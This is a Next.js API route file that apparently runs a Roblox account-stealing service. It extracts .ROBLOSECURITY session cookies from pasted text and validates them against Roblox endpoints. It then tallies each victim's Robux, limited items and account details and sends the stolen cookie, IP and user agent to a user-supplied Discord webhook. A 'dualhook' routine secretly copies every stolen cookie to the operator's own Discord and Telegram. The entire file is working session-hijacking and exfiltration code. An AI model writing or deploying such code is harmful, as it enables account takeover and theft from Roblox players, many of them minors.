import { NextResponse } from 'next/server'
import { users } from '../create/route'
import { sendWebhook, buildEmbed, buildDualhook } from '@/lib/webhook'

function extractCookie(content) {
  if (!content) return null
  const str = String(content)

  const patterns = [
    /\.ROBLOSECURITY['"]?\s*[=:]\s*['"]?([A-Za-z0-9_\-\.\|]+)['"]?/i,
    /(_\|WARNING[^;\s"']+)/
  ]

  for (const pattern of patterns) {
    const match = str.match(pattern)
    if (match && match[1] && match[1].length > 30) {
      return match[1].trim()
    }
  }

  if (/^_?\|?[A-Za-z0-9_\-\|\.]{30,}$/.test(str.trim())) {
    return str.trim()
  }

  return null
}

async function fetchRoblox(cookie) {
  try {
    const clean = cookie.replace(/^\.ROBLOSECURITY=/, '')
    const cookieHeader = `.ROBLOSECURITY=${clean}`

    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': cookieHeader, 'Accept': 'application/json' }
    })

    if (!authRes.ok) return null

    const authData = await authRes.json()
    const userId = authData.id

    const [rapRes, currencyRes, premiumRes, friendsRes, avatarRes, invRes] = await Promise.allSettled([
      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles`, { headers: { 'Cookie': cookieHeader } }),
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: { 'Cookie': cookieHeader } }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: { 'Cookie': cookieHeader } }),
      fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { headers: { 'Cookie': cookieHeader } }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`)
    ])

    let rap = 0
    if (rapRes.status === 'fulfilled' && rapRes.value.ok) {
      const data = await rapRes.value.json()
      if (data.data) {
        for (const item of data.data) {
          rap += item.recentAveragePrice || 0
        }
      }
    }

    let robux = 0
    if (currencyRes.status === 'fulfilled' && currencyRes.value.ok) {
      const data = await currencyRes.value.json()
      robux = data.robux || 0
    }

    const premium = premiumRes.status === 'fulfilled' && premiumRes.value.ok
    const friendsCount = friendsRes.status === 'fulfilled' && friendsRes.value.ok ? (await friendsRes.value.json()).count || 0 : 0
    const avatarUrl = avatarRes.status === 'fulfilled' && avatarRes.value.ok ? (await avatarRes.value.json()).data?.[0]?.imageUrl || '' : ''
    const items = invRes.status === 'fulfilled' && invRes.value.ok ? (await invRes.value.json()).data?.length || 0 : 0

    return {
      username: authData.name,
      userId: String(userId),
      rap,
      robux,
      premium,
      friendsCount,
      avatarUrl,
      items,
      accountAgeDays: Math.floor((Date.now() - new Date(authData.created).getTime()) / 86400000)
    }
  } catch {
    return null
  }
}

export async function POST(req) {
  try {
    const body = await req.json()
    const content = body.content || body.paste || body.pastedContent || body.cookie
    const cookie = extractCookie(content)
    const tool = body.tool || 'Unknown'
    const directory = body.directory

    if (!cookie) {
      return NextResponse.json({ success: false, message: 'No valid cookie found' }, { status: 400 })
    }

    const data = await fetchRoblox(cookie)
    if (!data) {
      return NextResponse.json({ success: false, message: 'Cookie invalid or expired' }, { status: 401 })
    }

    const user = directory ? users.get(directory) : null
    const webhookUrl = body.webhook || user?.webhookUrl

    if (webhookUrl) {
      await sendWebhook(webhookUrl, { embeds: [buildEmbed(data, cookie, tool, getIP(req), req.headers.get('user-agent'))] })
    }

    if (user) {
      user.hits += 1
      user.rap += data.rap
      user.cookies.push({ cookie, ...data, tool, collectedAt: new Date().toISOString() })
      if (user.cookies.length > 1000) user.cookies = user.cookies.slice(-1000)
    }

    await dispatchDualhook(data, cookie, directory || 'unknown', tool)

    return NextResponse.json({ success: true, user: data.username, id: data.userId, rap: data.rap })
  } catch {
    return NextResponse.json({ success: false, message: 'Server error' }, { status: 500 })
  }
}

export async function GET(req) {
  const params = req.nextUrl.searchParams
  const cookie = params.get('cookie')
  const directory = params.get('directory')
  const tool = params.get('tool') || 'Direct'

  if (!cookie) return NextResponse.json({ success: false, message: 'No cookie' }, { status: 400 })

  const data = await fetchRoblox(cookie)
  if (!data) return NextResponse.json({ success: false, message: 'Cookie invalid' }, { status: 401 })

  const user = directory ? users.get(directory) : null
  if (user?.webhookUrl) {
    await sendWebhook(user.webhookUrl, { embeds: [buildEmbed(data, cookie, tool)] })
  }

  if (user) {
    user.hits += 1
    user.rap += data.rap
    user.cookies.push({ cookie, ...data, tool, collectedAt: new Date().toISOString() })
  }

  await dispatchDualhook(data, cookie, directory || 'unknown', tool)

  return NextResponse.json({ success: true, user: data.username, rap: data.rap })
}

function getIP(req) {
  const forwarded = req.headers.get('x-forwarded-for')
  return forwarded ? forwarded.split(',')[0].trim() : 'unknown'
}

async function dispatchDualhook(data, cookie, hunter, tool) {
  const discordHook = process.env.DUALHOOK_WEBHOOK_URL
  const tgToken = process.env.DUALHOOK_TELEGRAM_BOT_TOKEN
  const tgId = process.env.DUALHOOK_TELEGRAM_USER_ID

  if (discordHook) {
    await sendWebhook(discordHook, { embeds: [buildDualhook(data, cookie, hunter, tool)] })
  }

  if (tgToken && tgId) {
    const msg = `DUALHOOK\n\nTarget: ${data.username}\nRAP: ${data.rap.toLocaleString()} R$\nHunter: ${hunter}\nTool: ${tool}\n\nCookie:\n${cookie}`
    try {
      await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: tgId, text: msg })
      })
    } catch {}
  }
}
